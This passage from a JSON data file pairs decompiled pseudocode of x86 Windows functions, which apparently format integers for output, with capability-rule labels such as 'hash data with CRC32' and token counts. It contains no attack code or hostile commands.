    }\n        else {\n            cVar1 = fcn.0043e2fd(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f733(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f445(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac12();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 0;\n        if (iVar2 == 8) {\n            fcn.00446465(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00444fdc(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != '0')))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1051
    },
    "004433be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004433be(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x0044349f;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x0044349f;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x0044349f:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.004464ef(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00445059(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1243
    },
    "0044354b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044354b(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x0044362c;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x0044362c;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x0044362c:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00446579(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.004450d6(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1245
    },
    "004436d8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004436d8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043da00(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d742(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e0ce(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dcbe(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e635(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e386(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f7cd(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f4df(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac28();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 0;\n        if (iVar2 == 8) {\n            fcn.00446603(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00445153(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != '0')))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1049
    },
    "00443874": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443874(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00443955;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00443955;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00443955:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.0044668d(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.004451d0(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1242
    },
    "00443a01": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443a01(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00443ae2;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00443ae2;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00443ae2:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00446717(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.0044524d(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1246
    },
    "00443b93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443b93(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043da8f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d7d1(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e15d(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dd4d(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e6cb(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e40f(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f867(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f579(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac3e();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 1;\n        if (iVar2 == 8) {\n            fcn.004467ad(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.004452d7(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != 0x30)))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1054
    },
    "00443d33": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443d33(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00443e14;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00443e14;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00443e14:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00446843(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00445361(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1245
    },
    "00443ec5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443ec5(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00443fa6;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00443fa6;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00443fa6:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.004468d9(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.004453eb(arg_8h_00, arg_8h);\n    }\n    